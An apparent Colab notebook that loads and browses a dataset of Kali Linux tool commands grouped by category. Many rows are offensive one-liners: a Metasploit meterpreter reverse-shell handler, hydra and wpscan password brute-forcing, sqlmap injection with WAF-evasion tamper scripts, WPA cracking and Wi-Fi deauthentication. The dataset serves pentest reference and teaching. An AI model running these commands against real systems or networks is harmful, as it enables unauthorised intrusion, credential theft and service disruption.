0,AddressSanitizer,gcc -fsanitize=address -g program.c,Compile C code with memory error detection.,Code Analysis,Memory analysis,"[-fsanitize=address, -g]",https://clang.llvm.org/docs/AddressSanitizer.html
1,Bandit,bandit -r src,Scan Python code for security vulnerabilities.,Code Analysis,Security analysis,[-r],https://bandit.readthedocs.io/
2,Checkstyle,checkstyle -c sun_checks.xml Main.java,Enforce Java coding standards.,Code Analysis,Code style,[-c],https://checkstyle.sourceforge.io/
3,Clang,clang --analyze main.c,Static analysis for C/C++ code.,Code Analysis,Static analysis,[--analyze],https://clang.llvm.org/docs/ClangStaticAnalyze...
4,Clazy,clazy main.cpp,Qt-oriented static analysis for C++.,Code Analysis,Static analysis,[],https://github.com/KDE/clazy
...,...,...,...,...,...,...,...
785,wifite,wifite --cracked,Show previously cracked networks.,Wireless Attacks,Attack history,[--cracked],https://github.com/derv82/wifite2
786,wifite,wifite --dict wordlist.txt -i wlan0,Use custom wordlist for cracking.,Wireless Attacks,Password cracking,"[--dict, -i]",https://github.com/derv82/wifite2
787,wifite,wifite --pmkid -i wlan0,Capture PMKID for WPA attack.,Wireless Attacks,PMKID attack,"[--pmkid, -i]",https://github.com/derv82/wifite2
788,wifite,wifite --kill -i wlan0,Kill conflicting processes before attack.,Wireless Attacks,Automated Wi-Fi attack,"[--kill, -i]",https://github.com/derv82/wifite2



Output saved to 'kali_linux_tools_organized.csv'


In [ ]:
    # Drop the unwanted columns before displaying
    columns_to_drop = ['category', 'os', 'supported_languages']
    display_df = category_tools.drop(columns=columns_to_drop, errors='ignore')

    # Display the filtered DataFrame
    display(display_df)


## **Using Python To Organize The Data:**

In [ ]:
import json

# The file path is stored in the 'path' variable from the previous step
file_path = f'{path}/KALI_LINUX_TOOLS_DATASET.jsonl'

# Initialize an empty list to store the parsed JSON objects
json_data = []

# Read the .jsonl file line by line and parse each JSON object
with open(file_path, 'r') as f:
    for line in f:
        json_data.append(json.loads(line))

print(f"Loaded {len(json_data)} entries.")
print("\nFirst 3 parsed entries (Python dictionaries):")
# Display the first few entries from the list
for i, entry in enumerate(json_data[:3]):
    print(f"Entry {i+1}:")
    for key, value in entry.items():
        print(f"  {key}: {value}")
    print("\n")

Loaded 790 entries.

First 3 parsed entries (Python dictionaries):
Entry 1:
  tool: nmap
  command: nmap -sV -p 1-65535 192.168.1.1
  description: Scan all TCP ports and detect service versions on a target host.
  category: Networking
  use_case: Port scanning and service detection
  flags: ['-sV', '-p']
  os: Linux
  reference_link: https://nmap.org/book/man-briefoptions.html


Entry 2:
  tool: nmap
  command: nmap -sS -O 192.168.1.1
  description: Perform a stealth SYN scan and OS detection.
  category: Networking
  use_case: Stealth scanning and OS fingerprinting
  flags: ['-sS', '-O']
  os: Linux
  reference_link: https://nmap.org/book/man-briefoptions.html


Entry 3:
  tool: metasploit
  command: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run'
  description: Set up a reverse TCP handler for incoming connections.
  category: Exploitation
  use_case: Exploit handling and payload delivery
  flags: ['-q', '-x']
  

You can then query this `json_data` list using list comprehensions or loops. For example, to find all tools in the 'Web Application' category:

In [ ]:
web_app_tools_list = [tool for tool in json_data if tool['category'] == 'Web Application']

print(f"Found {len(web_app_tools_list)} web application tools (first 2 entries):\n")
for i, tool in enumerate(web_app_tools_list[:2]):
    print(f"Tool {i+1}:")
    for key, value in tool.items():
        print(f"  {key}: {value}")
    print("\n")

Found 86 web application tools (first 2 entries):

Tool 1:
  tool: sqlmap
  command: sqlmap -u http://example.com --dbs
  description: Enumerate databases on a vulnerable web application.
  category: Web Application
  use_case: SQL injection testing
  flags: ['-u', '--dbs']
  os: Linux
  reference_link: http://sqlmap.org/


Tool 2:
  tool: burpsuite
  command: java -jar burpsuite.jar
  description: Launch Burp Suite for web vulnerability testing.
  category: Web Application
  use_case: Web application security testing
  flags: []
  os: Linux
  reference_link: https://portswigger.net/burp/documentation




## Using `google.colab.data_table`

Run this cell first to enable the interactive tables for all subsequent DataFrame displays. Once enabled, any `display(df)` or `df` as the last line of a cell will render as an interactive table.

In [ ]:
from google.colab import data_table
data_table.enable_dataframe_formatter()

#### Display the entire DataFrame `df` as an interactive table

Now, let's display the full `df`. You'll notice it's now an interactive table where you can sort columns, filter rows, and navigate pages.

In [ ]:
print("Full dataset as an interactive table:")
display(df)

Full dataset as an interactive table:


,tool,command,description,category,use_case,flags,os,reference_link,supported_languages
0,nmap,nmap -sV -p 1-65535 192.168.1.1,Scan all TCP ports and detect service versions...,Networking,Port scanning and service detection,"[-sV, -p]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
1,nmap,nmap -sS -O 192.168.1.1,Perform a stealth SYN scan and OS detection.,Networking,Stealth scanning and OS fingerprinting,"[-sS, -O]",Linux,https://nmap.org/book/man-briefoptions.html,NaN
2,metasploit,msfconsole -q -x 'use exploit/multi/handler; s...,Set up a reverse TCP handler for incoming conn...,Exploitation,Exploit handling and payload delivery,"[-q, -x]",Linux,https://docs.metasploit.com/,NaN
3,sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases on a vulnerable web applic...,Web Application,SQL injection testing,"[-u, --dbs]",Linux,http://sqlmap.org/,NaN
4,hydra,hydra -l admin -P passwords.txt ftp://192.168.1.1,Brute-force FTP credentials using a password l...,Password Cracking,Credential brute-forcing,"[-l, -P]",Linux,https://www.kali.org/tools/hydra/,NaN
...,...,...,...,...,...,...,...,...,...
785,faraday,faraday-cli export --format txt --output repor...,Export Faraday data to text.,Reporting,Report export,"[--format, --output]",Linux,https://faradaysec.com/documentation/,NaN
786,pandoc,pandoc report.md -s -o report.html,Convert Markdown to standalone HTML.,Reporting,Format conversion,"[-s, -o]",Linux,https://pandoc.org/MANUAL.html,NaN
787,metagoofil,metagoofil -d example.com -t all -o report.json,Generate JSON report of all metadata findings.,Reporting,Metadata reporting,"[-d, -t, -o]",Linux,https://github.com/laramies/metagoofil,NaN
788,nmap,nmap -oX scan.xml -T4 192.168.1.100,Export Nmap results to XML with aggressive tim...,Reporting,Scan reporting,"[-oX, -T4]",Linux,https://nmap.org/book/man.html,NaN


#### Display categorized tools with `data_table`

The categorized output we generated earlier will also benefit from `data_table`. The `display_df` for each category will now be an interactive table, making it much easier to explore the tools within each group.

In [ ]:
# @title Kali-Linux Tools Dataset
# Sort the DataFrame first by 'category' and then by 'tool' name
sorted_df = df.sort_values(by=['category', 'tool']).reset_index(drop=True)

# Get all unique categories, sorted alphabetically
sorted_categories = sorted(df['category'].unique())

for category in sorted_categories:
    print(f"\n--- Category: {category} ---")
    category_tools = sorted_df[sorted_df['category'] == category]

    # Drop the unwanted columns before displaying
    columns_to_drop = ['category', 'os', 'supported_languages']
    display_df = category_tools.drop(columns=columns_to_drop, errors='ignore')

    # Display the filtered DataFrame as an interactive table
    display(display_df)


--- Category: Code Analysis ---


,tool,command,description,use_case,flags,reference_link
0,AddressSanitizer,gcc -fsanitize=address -g program.c,Compile C code with memory error detection.,Memory analysis,"[-fsanitize=address, -g]",https://clang.llvm.org/docs/AddressSanitizer.html
1,Bandit,bandit -r src,Scan Python code for security vulnerabilities.,Security analysis,[-r],https://bandit.readthedocs.io/
2,Checkstyle,checkstyle -c sun_checks.xml Main.java,Enforce Java coding standards.,Code style,[-c],https://checkstyle.sourceforge.io/
3,Clang,clang --analyze main.c,Static analysis for C/C++ code.,Static analysis,[--analyze],https://clang.llvm.org/docs/ClangStaticAnalyze...
4,Clazy,clazy main.cpp,Qt-oriented static analysis for C++.,Static analysis,[],https://github.com/KDE/clazy
5,Codacy,codacy-analysis-cli analyze,Run Codacy CLI for automated code review.,Code quality,[analyze],https://docs.codacy.com/
6,CodeScene,codescene analyze,Behavioral code analysis for quality.,Code quality,[analyze],https://codescene.io/docs/
7,CodeSonar,codesonar analyze project,Deep static analysis for multiple languages.,Static analysis,[analyze],https://www.grammatech.com/products/codesonar
8,Coverity,cov-analyze --dir cov-int,Analyze code for defects and vulnerabilities.,Static analysis,[--dir],https://www.synopsys.com/software-integrity/co...
9,Cppcheck,cppcheck --enable=all main.c,Static analysis for C/C++ code.,Static analysis,[--enable],http://cppcheck.sourceforge.net/



--- Category: Exploitation ---


,tool,command,description,use_case,flags,reference_link
50,burpsuite,burpsuite,Launch Burp Suite for web vulnerability testing.,Web application testing,[],https://portswigger.net/burp/documentation
51,burpsuite,burpsuite --proxy,Start Burp Suite proxy for intercepting traffic.,Traffic interception,[--proxy],https://portswigger.net/burp/documentation
52,burpsuite,burpsuite --scanner,Run Burp Suite scanner for vulnerabilities.,Vulnerability scanning,[--scanner],https://portswigger.net/burp/documentation
53,burpsuite,burpsuite --repeater,Use Burp Suite repeater for manual testing.,Manual exploitation,[--repeater],https://portswigger.net/burp/documentation
54,burpsuite,burpsuite --intruder,Use Burp Suite intruder for automated attacks.,Automated exploitation,[--intruder],https://portswigger.net/burp/documentation
...,...,...,...,...,...,...
124,sqlmap,sqlmap -u http://example.com --file-write=/tmp...,Write a file via SQL injection.,File access,"[-u, --file-write]",http://sqlmap.org/
125,sqlmap,sqlmap -u http://example.com --tamper=space2co...,Use tamper script to bypass WAF.,SQL injection,"[-u, --tamper]",http://sqlmap.org/
126,sqlmap,sqlmap -u http://example.com --batch,Run SQL injection in non-interactive mode.,SQL injection,"[-u, --batch]",http://sqlmap.org/
127,sqlmap,sqlmap -u http://example.com --cookie='id=1',Perform SQL injection with a cookie.,SQL injection,"[-u, --cookie]",http://sqlmap.org/



--- Category: Forensics ---


...

,tool,command,description,use_case,flags,reference_link
629,burpsuite,java -jar burpsuite.jar,Launch Burp Suite for web vulnerability testing.,Web application security testing,[],https://portswigger.net/burp/documentation
630,burpsuite,java -jar burpsuite.jar --proxy 127.0.0.1:8080,Start Burp Suite with a proxy listener.,Web traffic interception,[--proxy],https://portswigger.net/burp/documentation
631,burpsuite,java -jar burpsuite.jar --spider http://exampl...,Crawl a website using Burp Suite’s spider.,Website crawling,[--spider],https://portswigger.net/burp/documentation
632,burpsuite,java -jar burpsuite.jar,Launch Burp Suite for web vulnerability testing.,Web application security testing,[],https://portswigger.net/burp/documentation
633,burpsuite,java -jar burpsuite.jar --proxy 127.0.0.1:8080,Start Burp Suite with a proxy listener.,Web traffic interception,[--proxy],https://portswigger.net/burp/documentation
...,...,...,...,...,...,...
710,wpscan,wpscan --url http://example.com --passwords pa...,Brute-force WordPress login credentials.,WordPress brute-forcing,"[--url, --passwords]",https://wpscan.com/wordpress-security-scanner
711,wpscan,wpscan --url http://example.com --enumerate ap,Enumerate all WordPress plugins.,WordPress plugin scanning,"[--url, --enumerate]",https://wpscan.com/wordpress-security-scanner
712,wpscan,wpscan --url http://example.com --disable-tls-...,Scan WordPress site without TLS certificate va...,WordPress vulnerability scanning,"[--url, --disable-tls-checks]",https://wpscan.com/wordpress-security-scanner
713,wpscan,wpscan --url http://example.com --random-agent,Scan WordPress site with a random user agent.,WordPress vulnerability scanning,"[--url, --random-agent]",https://wpscan.com/wordpress-security-scanner



--- Category: Wireless ---


,tool,command,description,use_case,flags,reference_link
715,aircrack-ng,aircrack-ng -w wordlist.txt capture.cap,Crack WEP/WPA keys from captured packets.,Wireless network key cracking,[-w],https://www.aircrack-ng.org/
716,aircrack-ng,airmon-ng start wlan0,Enable monitor mode on a wireless interface.,Wireless packet capturing,[start],https://www.aircrack-ng.org/
717,aircrack-ng,airodump-ng wlan0mon --bssid 00:11:22:33:44:55,Capture packets from a specific wireless acces...,Wireless traffic analysis,[--bssid],https://www.aircrack-ng.org/
718,aircrack-ng,aircrack-ng -a 2 -w wordlist.txt capture.cap,Crack WPA2 keys from captured packets.,WPA2 key cracking,"[-a, -w]",https://www.aircrack-ng.org/
719,aircrack-ng,aireplay-ng --deauth 10 -a 00:11:22:33:44:55 w...,Send deauthentication packets to a wireless AP.,Wireless deauthentication attack,"[--deauth, -a]",https://www.aircrack-ng.org/



--- Category: Wireless Attacks ---


,tool,command,description,use_case,flags,reference_link
720,aircrack-ng,aircrack-ng capture.cap,Crack WEP/WPA keys from a captured file.,Password cracking,[],https://www.aircrack-ng.org/documentation.html
721,aircrack-ng,aircrack-ng -w wordlist.txt capture.cap,Crack WPA key using a wordlist.,Password cracking,[-w],https://www.aircrack-ng.org/documentation.html
722,aircrack-ng,aircrack-ng -b 00:11:22:33:44:55 capture.cap,Crack key for a specific AP.,Password cracking,[-b],https://www.aircrack-ng.org/documentation.html
723,aircrack-ng,aircrack-ng -J capture capture.cap,Generate an hccap file for WPA cracking.,Password cracking,[-J],https://www.aircrack-ng.org/documentation.html
724,aircrack-ng,aircrack-ng -e FreeWiFi capture.cap,Crack key for an AP with specific ESSID.,Password cracking,[-e],https://www.aircrack-ng.org/documentation.html
...,...,...,...,...,...,...
785,wifite,wifite --cracked,Show previously cracked networks.,Attack history,[--cracked],https://github.com/derv82/wifite2
786,wifite,wifite --dict wordlist.txt -i wlan0,Use custom wordlist for cracking.,Password cracking,"[--dict, -i]",https://github.com/derv82/wifite2
787,wifite,wifite --pmkid -i wlan0,Capture PMKID for WPA attack.,PMKID attack,"[--pmkid, -i]",https://github.com/derv82/wifite2
788,wifite,wifite --kill -i wlan0,Kill conflicting processes before attack.,Automated Wi-Fi attack,"[--kill, -i]",https://github.com/derv82/wifite2
